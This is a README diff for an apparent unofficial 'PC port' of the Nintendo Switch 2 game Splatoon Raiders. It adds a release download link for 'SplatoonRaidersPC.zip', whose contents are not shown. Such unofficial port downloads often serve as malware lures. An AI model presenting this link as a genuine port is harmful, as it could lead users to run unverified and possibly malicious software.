@@ -7,7 +7,7 @@ Splatoon Raiders releases for Nintendo Switch 2 on July 23, 2026. Nintendo
 <img width="646" height="318" alt="logo" src="https://github.com/user-attachments/assets/15810364-b5fb-4046-95c9-c1eb9b865be3" />
 
 ## Install
-[Download ``]()
+[Download `SplatoonRaidersPC.zip`](https://github.com/Splatoon-Raiders/Splatoon-Raiders-PC-Port/releases/download/2026-07-23/SplatoonRaidersPC.zip)
 ---
 
 <img width="1920" height="1080" alt="images2" src="https://github.com/user-attachments/assets/10857c49-e0c7-48c5-ad93-736dc8ab1eb0" />
